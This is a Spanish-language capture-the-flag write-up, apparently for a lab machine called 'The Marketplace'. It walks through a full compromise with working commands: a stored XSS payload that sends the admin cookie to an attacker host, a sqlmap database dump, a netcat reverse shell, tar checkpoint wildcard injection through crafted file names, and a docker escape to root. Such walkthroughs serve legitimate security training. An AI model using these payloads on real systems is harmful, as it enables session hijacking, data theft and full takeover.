
# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-07-12 18:50:04 EDT for 41s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 62 nginx 1.19.2
32768/tcp open  http    syn-ack ttl 62 Node.js (Express middleware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
```

Nuestro escaneo de nmap, nos da 3 puertos abiertos. Comenzamos navegando al servidor web para ver como esta estructurado. Nos topamos con una sesion de logeo, en el que probamos credenciales por defecto "admin:admin". Como esto no funciona, nos creamos una cuenta para testear. Una vez creada la cuenta, nos dirigimos al apartado de **New listing** y creamos una consulta aplicando XSS.

```bash
Title: Test
Description : <script>alert("hello")</script>
```

Obtenemos respuesta positiva, asique sabemos que es vulnerable a xss. 

# Intrusion

Aplicamos una consulta para robar la entidad del administrador poniendonos en escucha, en nuestra maquina atacante, y creamos una consulta que nos envie una respuesta http a nuestra maquina.

```bash
Title: Steal
Description: <script>fetch('http://LHOST:LPORT/steal?cookie=' + btoa(document.cookie));</script>

# Nos ponemos en escucha
nc -nvlp LPORT
```

Una vez creado, tenemos que reportar el problema para recibir una respuesta, de parte del "soporte(admin)". Clickeamos en **Report Listing to Admins** y luego **Report**. Mientras tanto, en nuestra terminal en escucha, nos va a dar una respuesta con la cookie del administrador.

```bash
Listening on 0.0.0.0 LPORT
Connection received on
GET /steal?cookie='dG9rZW49ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJN...' HTTP/1.1
Host:
Connection: keep-alive
```

Lo que tenemos que hacer, es decodificar esta cookie y luego tendremos que colocarla en nuestra sesion del navegador. Para colocar la cookie a nuestra sesion del navegador, nos dirigimos a **F12 >Storage >Cookies** y sobreescribimos con la cookie decodificada.

```bash
echo "dG9rZW49ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJN..." | base64 -d
```

Nos vamos a **Administrator Panel**, reclamos nuestra flag y vemos los usuarios del sistema. Intente hacer path traversal para ver si tenia exito, pero me tope con que acepta consultas sql. En este caso utilizare sqlmap para obtener una enumeracion rapida del sistema.

```bash
sqlmap -u http://IPTARGET/admin/user=1 --technique=U -p user --cookie="token=eyJhbGciOi..." --dump --level 1
```

Pude ver los usuarios con su respectivo hash y tambien me enlisto los mensajes del sistema, en el cual uno de ellos me indica una password de algun usuario.

```bash
Database: marketplace
Table: messages
[17 entries]
+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | is_read | user_to | user_from | message_content                                                                                                                                                                                   |
+----+---------+---------+-----------+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | 1       | 3       | 1         | 'Hello!\r\nAn automated system has detected your SSH password is too weak and needs to be changed. You have been generated a new temporary password.\r\nYour new password is: REDACTED'  
```

Lo que hice, fue establecer una conexion ssh entre los usuarios hasta que pude conectarme correctamente.

```bash
ssh jake@IPTARGET
```

## Michael

Nos moveremos entre usuario, primero listamos los permisos de superusuario con jake, creamos un archivo .sh con una reverse shell y luego crear archivos vacio que lo que ejecutaremos como usuario michael una sesion interactiva con sus privilegios.

```bash
sudo -l # Listamos permisos superusuario

User jake may run the following commands on the-marketplace:
    (michael) NOPASSWD: /opt/backups/backup.sh


cd /opt/backups # Nos movemos al directorio

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f" > shell.sh # Creamos nuestra reverse shell dentro del sistema

echo ""> "--checkpoint-action=exec=sh shell.sh"  # Creamos archivo vacio que ejecutara nuestra shell
echo ""> --checkpoint=1 # Generamos punto de control

chmod 777 backup.tar # Damos todos los permisos 

nc -nvlp LPORT # Nos ponemos en escucha

sudo -u michael ./backup.sh # Ejecutamos como usuario michael
```

# Priv.Escalation

Upgradeamos nuestra shell :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Buscamos permisos elevados:

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

Escalaremos privilegios con `docker`

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Informacion obtenida https://gtfobins.github.io/gtfobins/docker/